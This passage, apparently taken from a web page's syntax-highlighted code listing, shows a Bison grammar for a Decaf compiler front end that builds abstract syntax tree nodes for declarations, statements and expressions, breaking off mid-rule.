class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;default-defs.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yylex</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yyerror</span><span class="params">(<span class="keyword">char</span> *)</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// print AST?</span></span><br><span class="line"><span class="keyword">bool</span> printAST = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;decafast.cc&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">%define parse.error verbose</span><br><span class="line"></span><br><span class="line">%<span class="class"><span class="keyword">union</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">decafAST</span> *<span class="title">ast</span>;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> *sval;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">%token T_PACKAGE T_EXTERN T_FUNC T_SEMICOLON T_COMMA T_CONTINUE T_FALSE T_TRUE T_VAR T_FOR T_NULL T_RETURN T_WHITESPACE</span><br><span class="line">%token T_AND T_ASSIGN T_DIV T_DOT T_EQ T_RIGHTSHIFT T_GEQ T_GT T_LEFTSHIFT T_LEQ T_LT T_MINUS T_MOD T_MULT T_NEQ T_NOT T_OR T_PLUS</span><br><span class="line">%token T_VOID T_INTTYPE T_BOOLTYPE T_STRINGTYPE</span><br><span class="line">%token T_LCB T_RCB T_LPAREN T_RPAREN T_LSB T_RSB </span><br><span class="line">%token T_COMMENT</span><br><span class="line">%token T_BREAK T_ELSE T_IF T_WHILE</span><br><span class="line">%token &lt;sval&gt; T_ID T_INTCONSTANT T_CHARCONSTANT T_STRINGCONSTANT</span><br><span class="line"></span><br><span class="line">%type &lt;ast&gt; state_if state_while lvalues state_for state_break state_continue state_return <span class="built_in">exp</span> assign assigns assignss method_call lvalue statements statement extern_list para_list_use para_usen para_use para_list_def block blockt var_decls var_decl method_decls method_decl decafpackage var_declp var_declps extern_def extern_defn extern_typen extern_type func_typen func_type method_type type</span><br><span class="line"></span><br><span class="line">%right T_ASSIGN </span><br><span class="line">%left T_OR</span><br><span class="line">%left T_AND</span><br><span class="line">%left T_EQ T_NEQ T_LT T_GT T_GEQ T_LEQ</span><br><span class="line">%left T_PLUS T_MINUS </span><br><span class="line">%left T_MULT T_DIV T_MOD T_RIGHTSHIFT T_LEFTSHIFT</span><br><span class="line">%right T_NOT </span><br><span class="line">%right T_UMINUS</span><br><span class="line">%right T_LPAREN</span><br><span class="line">%left T_RPAREN</span><br><span class="line">%nonassoc T_IF</span><br><span class="line">%nonassoc T_ELSE</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line">start: program</span><br><span class="line"></span><br><span class="line">program: extern_list decafpackage&#123; </span><br><span class="line">        ProgramAST *prog = <span class="keyword">new</span> ProgramAST((decafStmtList *)$<span class="number">1</span>, (PackageAST *)$<span class="number">2</span>); </span><br><span class="line">		<span class="keyword">if</span> (printAST) &#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; getString(prog) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="keyword">delete</span> prog;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_list: extern_defn &#123; </span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafStmtList *slist = <span class="keyword">new</span> decafStmtList();</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_defn: extern_def extern_defn &#123;</span><br><span class="line">        decafStmtList *slist = (decafStmtList *)$<span class="number">2</span>;</span><br><span class="line">        slist-&gt;push_front((decafAST *)$<span class="number">1</span>);</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafStmtList *slist = <span class="keyword">new</span> decafStmtList();</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_def: T_EXTERN T_FUNC T_ID T_LPAREN para_list_def T_RPAREN method_type T_SEMICOLON &#123;</span><br><span class="line">        decafEXFuncDef *func = <span class="keyword">new</span> decafEXFuncDef();</span><br><span class="line">        decafPara* para = (decafPara*)$<span class="number">5</span>;</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">7</span>;</span><br><span class="line">        func-&gt;put_name($<span class="number">3</span>);</span><br><span class="line">        func-&gt;put_type(type-&gt;get_type());</span><br><span class="line">        func-&gt;put_para((decafPara*)para);</span><br><span class="line">        $$ = func;</span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">3</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">para_list_use: para_usen &#123;</span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    | &#123;</span><br><span class="line">        decafStmtList *slist = <span class="keyword">new</span> decafStmtList();</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">para_usen: para_use T_COMMA para_usen &#123;</span><br><span class="line">        decafStmtList * para = (decafStmtList *)$<span class="number">3</span>;</span><br><span class="line">        para-&gt;push_front($<span class="number">1</span>);</span><br><span class="line">        $$ = para;</span><br><span class="line">    &#125;</span><br><span class="line">    | para_use &#123;</span><br><span class="line">        decafStmtList * para = <span class="keyword">new</span> decafStmtList();</span><br><span class="line">        para-&gt;push_front($<span class="number">1</span>);</span><br><span class="line">        $$ = para;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">para_use: method_call &#123; $$ = $<span class="number">1</span>;&#125;</span><br><span class="line">    | <span class="built_in">exp</span> &#123;$$ = $<span class="number">1</span>;&#125; </span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">para_list_def: extern_typen &#123;</span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | func_typen &#123;</span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafStmtList *slist = <span class="keyword">new</span> decafStmtList();</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">func_typen: func_type T_COMMA func_typen &#123;</span><br><span class="line">        decafPara * para = (decafPara *)$<span class="number">3</span>;</span><br><span class="line">        para-&gt;push_front((decafType *)$<span class="number">1</span>);</span><br><span class="line">        $$ = para;     </span><br><span class="line">    &#125;</span><br><span class="line">    | func_type &#123;</span><br><span class="line">        decafPara * para = <span class="keyword">new</span> decafPara();</span><br><span class="line">        para-&gt;push_front((decafType*)$<span class="number">1</span>);</span><br><span class="line">        $$ = para;   </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">func_type: T_ID extern_type &#123;</span><br><span class="line">        decafType* type = (decafType*)$<span class="number">2</span>;</span><br><span class="line">        type-&gt;put_name(*$<span class="number">1</span>);</span><br><span class="line">        $$ = type;</span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">1</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_typen: extern_type T_COMMA extern_typen &#123;</span><br><span class="line">        decafPara * para = (decafPara *)$<span class="number">3</span>;</span><br><span class="line">        para-&gt;push_front((decafType *)$<span class="number">1</span>);</span><br><span class="line">        $$ = para;</span><br><span class="line">    &#125;</span><br><span class="line">    | extern_type &#123;</span><br><span class="line">        decafPara * para = <span class="keyword">new</span> decafPara();</span><br><span class="line">        para-&gt;push_front((decafType*)$<span class="number">1</span>);</span><br><span class="line">        $$ = para;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_type: T_STRINGTYPE &#123; decafType* type = <span class="keyword">new</span> decafType(<span class="string">&quot;StringType&quot;</span>); $$ = type;&#125;</span><br><span class="line">    | type &#123; decafType* type = (decafType* )$<span class="number">1</span>; $$ = type;&#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">method_type: T_VOID &#123; decafType* type = <span class="keyword">new</span> decafType(<span class="string">&quot;VoidType&quot;</span>); $$ = type;&#125;</span><br><span class="line">    | type &#123; decafType* type = (decafType* )$<span class="number">1</span>; $$ = type;&#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">type: T_INTTYPE &#123; decafType* type = <span class="keyword">new</span> decafType(<span class="string">&quot;IntType&quot;</span>); $$ = type;&#125;</span><br><span class="line">    | T_BOOLTYPE &#123; decafType* type = <span class="keyword">new</span> decafType(<span class="string">&quot;BoolType&quot;</span>); $$ = type;&#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">decafpackage: T_PACKAGE T_ID T_LCB var_declps method_decls T_RCB &#123;</span><br><span class="line">        decafVarList *field = (decafVarList *)$<span class="number">4</span>;</span><br><span class="line">        decafStmtList *method = (decafStmtList *)$<span class="number">5</span>;</span><br><span class="line">        $$ = <span class="keyword">new</span> PackageAST(*$<span class="number">2</span>, field, method); </span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">2</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | T_PACKAGE T_ID T_LCB T_RCB &#123; </span><br><span class="line">        $$ = <span class="keyword">new</span> PackageAST(*$<span class="number">2</span>, <span class="keyword">new</span> decafVarList(), <span class="keyword">new</span> decafStmtList()); </span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">2</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">var_declps: var_declp var_declps &#123;</span><br><span class="line">        decafVarList *slist = (decafVarList *)$<span class="number">2</span>;</span><br><span class="line">        slist-&gt;cat_front((decafVarList *)$<span class="number">1</span>);</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafVarList *slist = <span class="keyword">new</span> decafVarList(); </span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">var_declp: T_VAR lvalues type T_SEMICOLON &#123;</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">3</span>;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = (decafVarList *)$<span class="number">2</span>;</span><br><span class="line">        <span class="built_in">list</span>-&gt;put_types(type-&gt;get_type());</span><br><span class="line">        <span class="built_in">list</span>-&gt;put_kinds(<span class="string">&quot;Scalar&quot;</span>);</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_VAR lvalue type T_ASSIGN <span class="built_in">exp</span> T_SEMICOLON &#123;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = <span class="keyword">new</span> decafVarList();</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">3</span>;</span><br><span class="line">        decafVar * var = (decafVar *)$<span class="number">2</span>;</span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = (decafAllexp *)$<span class="number">5</span>;</span><br><span class="line">        var-&gt;put_kind(<span class="string">&quot;Scalar&quot;</span>);</span><br><span class="line">        var-&gt;put_type(type-&gt;get_type());</span><br><span class="line">        var-&gt;put_exp(<span class="built_in">exp</span>);</span><br><span class="line">        <span class="built_in">list</span>-&gt;push_front(var);</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_VAR lvalue type T_SEMICOLON &#123;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = <span class="keyword">new</span> decafVarList();</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">3</span>;</span><br><span class="line">        decafVar * var = (decafVar *)$<span class="number">2</span>;</span><br><span class="line">        var-&gt;put_kind(<span class="string">&quot;Scalar&quot;</span>);</span><br><span class="line">        var-&gt;put_type(type-&gt;get_type());</span><br><span class="line">        <span class="built_in">list</span>-&gt;push_front(var);</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">var_decls: var_decl var_decls &#123;</span><br><span class="line">        decafVarList *slist = (decafVarList *)$<span class="number">2</span>;</span><br><span class="line">        slist-&gt;cat_front((decafVarList *)$<span class="number">1</span>);</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafVarList *slist = <span class="keyword">new</span> decafVarList(); </span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">var_decl: T_VAR lvalue type T_ASSIGN <span class="built_in">exp</span> T_SEMICOLON &#123;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = <span class="keyword">new</span> decafVarList();</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">3</span>;</span><br><span class="line">        decafVar * var = (decafVar *)$<span class="number">2</span>;</span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = (decafAllexp *)$<span class="number">5</span>;</span><br><span class="line">        var-&gt;put_type(type-&gt;get_type());</span><br><span class="line">        var-&gt;put_exp(<span class="built_in">exp</span>);</span><br><span class="line">        <span class="built_in">list</span>-&gt;push_front(var);</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_VAR lvalues type T_SEMICOLON &#123;</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">3</span>;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = (decafVarList *)$<span class="number">2</span>;</span><br><span class="line">        <span class="built_in">list</span>-&gt;put_types(type-&gt;get_type());</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_VAR lvalue type T_SEMICOLON &#123;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = <span class="keyword">new</span> decafVarList();</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">3</span>;</span><br><span class="line">        decafVar * var = (decafVar *)$<span class="number">2</span>;</span><br><span class="line">        var-&gt;put_type(type-&gt;get_type());</span><br><span class="line">        <span class="built_in">list</span>-&gt;push_front(var);</span><br><span class="line">        $$ = <span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">lvalues: lvalue T_COMMA lvalues &#123;</span><br><span class="line">        decafVar* var = (decafVar*)$<span class="number">1</span>;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = (decafVarList*)$<span class="number">3</span>;</span><br><span class="line">        <span class="built_in">list</span>-&gt;push_back(var);</span><br><span class="line">        $$=<span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | lvalue &#123;</span><br><span class="line">        decafVar* var = (decafVar*)$<span class="number">1</span>;</span><br><span class="line">        decafVarList * <span class="built_in">list</span> = <span class="keyword">new</span> decafVarList();</span><br><span class="line">        <span class="built_in">list</span>-&gt;push_back(var);</span><br><span class="line">        $$=<span class="built_in">list</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">lvalue: T_ID &#123; decafVar* var = <span class="keyword">new</span> decafVar(*$<span class="number">1</span>) ;$$ = var; <span class="keyword">delete</span> $<span class="number">1</span>;&#125;</span><br><span class="line">    | T_ID T_LSB <span class="built_in">exp</span> T_RSB &#123; </span><br><span class="line">        decafVar* var = <span class="keyword">new</span> decafVar(*$<span class="number">1</span>) ; </span><br><span class="line">        decafAllexp* arr = (decafAllexp *)$<span class="number">3</span>;</span><br><span class="line">        var-&gt;put_arr(arr);</span><br><span class="line">        var-&gt;put_kind(<span class="string">&quot;Array(&quot;</span>+arr-&gt;get_name()+<span class="string">&quot;)&quot;</span>);</span><br><span class="line">        $$ = var; </span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">CONSTANT : T_INTCONSTANT | T_CHARCONSTANT | T_STRINGCONSTANT &#123; &#125;;</span><br><span class="line"></span><br><span class="line">method_decls: method_decl method_decls&#123;</span><br><span class="line">        decafStmtList *slist = (decafStmtList *)$<span class="number">2</span>;</span><br><span class="line">        slist-&gt;push_front((decafAST *)$<span class="number">1</span>);</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafStmtList *slist = <span class="keyword">new</span> decafStmtList(); </span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">method_decl: T_FUNC T_ID T_LPAREN para_list_def T_RPAREN method_type block &#123;</span><br><span class="line">        decafFuncDef *func = <span class="keyword">new</span> decafFuncDef();</span><br><span class="line">        decafPara* para = (decafPara*)$<span class="number">4</span>;</span><br><span class="line">        decafStmtList * block = (decafStmtList*)$<span class="number">7</span>;</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">6</span>;</span><br><span class="line">        func-&gt;put_name($<span class="number">2</span>);</span><br><span class="line">        func-&gt;put_type(type-&gt;get_type());</span><br><span class="line">        func-&gt;put_para(para);</span><br><span class="line">        func-&gt;put_block(block);</span><br><span class="line">        $$ = func;</span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">2</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">blockt: T_LCB var_decls statements T_RCB &#123;</span><br><span class="line">        decafStmtList *field = (decafStmtList *)$<span class="number">2</span>;</span><br><span class="line">        decafStmtList *state = (decafStmtList *)$<span class="number">3</span>;</span><br><span class="line">        decafBlock *block = <span class="keyword">new</span> decafBlock(<span class="string">&quot;Block&quot;</span>,field,state);</span><br><span class="line">        $$ = block;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_LCB T_RCB &#123;</span><br><span class="line">        decafStmtList *field = <span class="keyword">new</span> decafStmtList(); </span><br><span class="line">        decafStmtList *state = <span class="keyword">new</span> decafStmtList(); </span><br><span class="line">        decafBlock *block = <span class="keyword">new</span> decafBlock(<span class="string">&quot;Block&quot;</span>,field,state);</span><br><span class="line">        $$ = block;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">block: T_LCB var_decls statements T_RCB &#123;</span><br><span class="line">        decafStmtList *field = (decafStmtList *)$<span class="number">2</span>;</span><br><span class="line">        decafStmtList *state = (decafStmtList *)$<span class="number">3</span>;</span><br><span class="line">        decafBlock *block = <span class="keyword">new</span> decafBlock(<span class="string">&quot;MethodBlock&quot;</span>,field,state);</span><br><span class="line">        $$ = block;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_LCB T_RCB &#123;</span><br><span class="line">        decafStmtList *field = <span class="keyword">new</span> decafStmtList(); </span><br><span class="line">        decafStmtList *state = <span class="keyword">new</span> decafStmtList(); </span><br><span class="line">        decafBlock *block = <span class="keyword">new</span> decafBlock(<span class="string">&quot;MethodBlock&quot;</span>,field,state);</span><br><span class="line">        $$ = block;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">statements: statement statements &#123;</span><br><span class="line">        decafStmtList *slist = (decafStmtList *)$<span class="number">2</span>;</span><br><span class="line">        slist-&gt;push_front((decafAST *)$<span class="number">1</span>);</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafStmtList *slist = <span class="keyword">new</span> decafStmtList(); </span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">statement: blockt &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | assign T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | method_call T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_return T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_if &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_while &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_for &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_break T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | state_continue T_SEMICOLON &#123; $$ = $<span class="number">1</span>; &#125;</span><br><span class="line">    | &#123;&#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_if: T_IF T_LPAREN <span class="built_in">exp</span> T_RPAREN blockt T_ELSE blockt &#123;</span><br><span class="line">        decafAllexp *<span class="built_in">exp</span> = (decafAllexp *)$<span class="number">3</span>; </span><br><span class="line">        decafBlock *if_block = (decafBlock *)$<span class="number">5</span>;</span><br><span class="line">        decafBlock *else_block = (decafBlock *)$<span class="number">7</span>;</span><br><span class="line">        decafIF *ifs = <span class="keyword">new</span> decafIF(<span class="built_in">exp</span>,if_block,else_block);</span><br><span class="line">        $$ = ifs;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_IF T_LPAREN <span class="built_in">exp</span> T_RPAREN blockt &#123;</span><br><span class="line">        decafAllexp *<span class="built_in">exp</span> = (decafAllexp *)$<span class="number">3</span>; </span><br><span class="line">        decafBlock *if_block = (decafBlock *)$<span class="number">5</span>;</span><br><span class="line">        decafIF *ifs = <span class="keyword">new</span> decafIF(<span class="built_in">exp</span>,if_block,<span class="literal">NULL</span>);</span><br><span class="line">        $$ = ifs;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_while: T_WHILE T_LPAREN <span class="built_in">exp</span> T_RPAREN blockt &#123;</span><br><span class="line">        decafAllexp *<span class="built_in">exp</span> = (decafAllexp *)$<span class="number">3</span>; </span><br><span class="line">        decafBlock *block = (decafBlock *)$<span class="number">5</span>;</span><br><span class="line">        decafWhile *whiles = <span class="keyword">new</span> decafWhile(<span class="built_in">exp</span>,block);</span><br><span class="line">        $$ = whiles;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_for: T_FOR T_LPAREN assignss T_SEMICOLON <span class="built_in">exp</span> T_SEMICOLON assignss T_RPAREN blockt&#123;</span><br><span class="line">        decafAllexp *<span class="built_in">exp</span> = (decafAllexp *)$<span class="number">5</span>; </span><br><span class="line">        decafBlock *block = (decafBlock *)$<span class="number">9</span>;</span><br><span class="line">        decafAssignList *aslist = (decafAssignList *)$<span class="number">3</span>; </span><br><span class="line">        decafAssignList *aslist2 = (decafAssignList *)$<span class="number">7</span>; </span><br><span class="line">        decafFor * fors = <span class="keyword">new</span> decafFor(<span class="built_in">exp</span>,block,aslist,aslist2);</span><br><span class="line">        $$ = fors;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_break: T_BREAK &#123;</span><br><span class="line">        decafOutput * data = <span class="keyword">new</span> decafOutput(<span class="string">&quot;BreakStmt&quot;</span>);</span><br><span class="line">        $$ = data;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_continue: T_CONTINUE &#123;</span><br><span class="line">        decafOutput * data = <span class="keyword">new</span> decafOutput(<span class="string">&quot;ContinueStmt&quot;</span>);</span><br><span class="line">        $$ = data;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">state_return: T_RETURN T_LPAREN <span class="built_in">exp</span> T_RPAREN &#123;</span><br><span class="line">        decafAllexp *<span class="built_in">exp</span> = (decafAllexp *)$<span class="number">3</span>; </span><br><span class="line">        decafReturn *ret = <span class="keyword">new</span> decafReturn(<span class="built_in">exp</span>);</span><br><span class="line">        $$ = ret;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_RETURN T_LPAREN T_RPAREN &#123;</span><br><span class="line">        decafReturn *ret = <span class="keyword">new</span> decafReturn(<span class="literal">NULL</span>);</span><br><span class="line">        $$ = ret;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_RETURN &#123;</span><br><span class="line">        decafReturn *ret = <span class="keyword">new</span> decafReturn(<span class="literal">NULL</span>);</span><br><span class="line">        $$ = ret;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">assignss : assigns &#123;</span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafAssignList *aslist = <span class="keyword">new</span> decafAssignList(); </span><br><span class="line">        $$ = aslist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">assigns: assign T_COMMA assigns &#123;</span><br><span class="line">        decafAssignList *aslist = (decafAssignList *)$<span class="number">3</span>; </span><br><span class="line">        decafAssign *ass = (decafAssign *)$<span class="number">1</span>; </span><br><span class="line">        aslist-&gt;push_front(ass);</span><br><span class="line">        $$ = aslist;</span><br><span class="line">    &#125;</span><br><span class="line">    | assign &#123;</span><br><span class="line">        decafAssignList *aslist = <span class="keyword">new</span> decafAssignList(); </span><br><span class="line">        decafAssign *ass = (decafAssign *)$<span class="number">1</span>; </span><br><span class="line">        aslist-&gt;push_front(ass);</span><br><span class="line">        $$ = aslist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">assign: lvalue T_ASSIGN <span class="built_in">exp</span> &#123;</span><br><span class="line">        decafVar* var = (decafVar *)$<span class="number">1</span>;</span><br><span class="line">        decafAllexp* <span class="built_in">exp</span> = (decafAllexp *)$<span class="number">3</span>;</span><br><span class="line">        decafAssign* ass = <span class="keyword">new</span> decafAssign(var-&gt;get_name(),<span class="built_in">exp</span>,<span class="literal">NULL</span>);</span><br><span class="line">        ass-&gt;put_arr(var-&gt;get_arr());</span><br><span class="line">        $$ = ass;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line"><span class="built_in">exp</span> : T_ID &#123; decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(*$<span class="number">1</span>,<span class="string">&quot;VariableExpr&quot;</span>); $$ = <span class="built_in">exp</span>; <span class="keyword">delete</span> $<span class="number">1</span>;&#125;</span><br><span class="line">    | T_ID T_LSB <span class="built_in">exp</span> T_RSB &#123; </span><br><span class="line">        decafAllexp * <span class="built_in">exp</span> = (decafAllexp *)$<span class="number">3</span>;</span><br><span class="line">        decafArrexp * arr = <span class="keyword">new</span> decafArrexp(*$<span class="number">1</span>,<span class="built_in">exp</span>); </span><br><span class="line">        $$ = arr; </span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | T_INTCONSTANT &#123; decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(*$<span class="number">1</span>,<span class="string">&quot;NumberExpr&quot;</span>); $$ = <span class="built_in">exp</span>; &#125;  </span><br><span class="line">    | T_CHARCONSTANT &#123; decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(*$<span class="number">1</span>,<span class="string">&quot;NumberExpr&quot;</span>); $$ = <span class="built_in">exp</span>; &#125;  </span><br><span class="line">    | T_STRINGCONSTANT &#123; decafAllexp * <span class="built_in">exp</span> = <span class="keyword">new</span> decafAllexp(*$<span class="number">1</span>,<span class="string">&quot;StringConstant&quot;</span>); $$ = <span class="built_in">exp</span>; &#125;  </span><br><span class="line">    | T_TRUE &#123; decafAllexp * <span class="built_in">exp</span> 